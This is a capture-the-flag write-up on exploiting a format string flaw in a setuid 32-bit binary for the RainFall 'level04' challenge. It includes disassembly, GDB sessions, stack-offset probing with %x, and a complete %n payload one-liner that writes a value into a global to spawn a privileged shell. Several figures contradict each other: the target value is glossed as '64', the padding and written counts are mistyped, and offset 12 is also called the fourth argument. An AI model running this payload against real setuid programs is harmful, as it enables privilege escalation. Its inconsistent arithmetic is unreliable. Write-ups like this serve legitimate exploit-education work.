# LEVEL04 - Format String 

> Vulnerability class: Format String
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, file

---

## Overview

The program passes user input directly to `printf()` without a format string specifier, giving an attacker full control over format string interpretation. By injecting `%n`, we write a controlled value into an uninitialized global variable, bypassing a comparison check and spawning a privileged shell.

---

## 1. Reconnaissance

```bash
   $ file level4
   level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
```
```bash
   $ checksec --file ./level4 
   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level4
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable


---

## 2. Static Analysis

Disassembling `n()` reveals a comparison against a global variable before spawning a shell:
```asm
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
```

`objdump -D` confirms `m` is an uninitialized global in the `.bss` section:
```asm
   08049810 <m>:
   8049810:       00 00                   add    %al,(%eax)
```

Goal: write the value `0x1025544` (64) into `m` at `0x8049810` to bypass the jump and reach `system()`.

---

### 2.2 Identifying the vulnerability

Disassembling `p()` shows `printf()` receives user input from `n()` as its first argument before being called:
```asm
      ### n()
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
```
```asm
      ### p()
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
```
Demonstration of user input in printf():
```bash
   (gdb) break printf
   Breakpoint 1 at 0x8048340
   (gdb) run
   Starting program: /home/user/level4/level4 
   test
   Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
   (gdb) info registers eax
   eax            0xbffff510       -1073744624
   (gdb) x/s 0xbffff510
   0xbffff510:      "test\n"
```

The correct usage would be `printf("%s", buffer)`. Without the `%s` specifier, user input is interpreted as the format string itself.

---

## 4. Vulnerability

Root cause: `printf(buffer)` passes user-controlled input as the format string. An attacker can inject format specifiers to read from (`%x`) or write to (`%n`) arbitrary memory addresses.

`%n` behaviour: `%n` writes the number of characters printed so far by `printf()` into the address provided as the corresponding argument. By placing a target address in the input buffer and referencing it with `%n`, we can write a controlled integer value to any writable memory location.

Impact: Arbitrary write primitive → control of any global variable → privilege escalation.

---

## 5. Exploitation


### 5.1 Offset calculation using `%x`

We identify which `%x` parameter corresponds to our input buffer by using `AAAA` (`0x41414141`) as a marker:
```bash
   level4@RainFall:~$ ./level4 
   AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
   AAAA.b7ff26b0.bffff354.b7fd0ff4.0.0.bffff318.804848d.bffff110.200.b7fd1ac0.b7ff37d0.41414141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
```
`0x41414141` appears at position **12**. Our input buffer is the 4th argument on the stack relative to `printf()`.

### 5.2 Payload construction using `%n`

We need `printf()` to have printed exactly 16930116 characters when `%n` fires, since `0x1025544 = 16930116`.
```txt
   [ 4 bytes: address of m ] + [ %1693012c ] + [ %12$n ]
```
8049810
- `\x10\x98\x04\x08` — address of `m` in little-endian (4 bytes, counted by `printf`)
- `%16930112c` — prints 60 additional characters, bringing the total to `4 + 16930112 = 16930116`
- `%12$n` — writes 1693016 into the address at the 12th argument (our buffer start = address of `m`)

### 5.3 Execution

```bash
level4@RainFall:~$ (python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112c%12$n"'; cat) | ./level4
[...]
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
```

---

## 6. Key Takeaways

| Concept | Detail |
|---|---|
| `printf(buffer)` is unsafe | Always use `printf("%s", buffer)` — never pass user input as the format string |
| `%x` for stack recon | Leaks stack values sequentially — used to locate input buffer offset |
| `%n` for arbitrary write | Writes character count to a pointer argument — powerful write primitive |
| `.bss` as write target | Uninitialized globals are writable and at predictable addresses |
| Character count precision | `%n` value = address bytes + padding characters — must equal target value exactly |

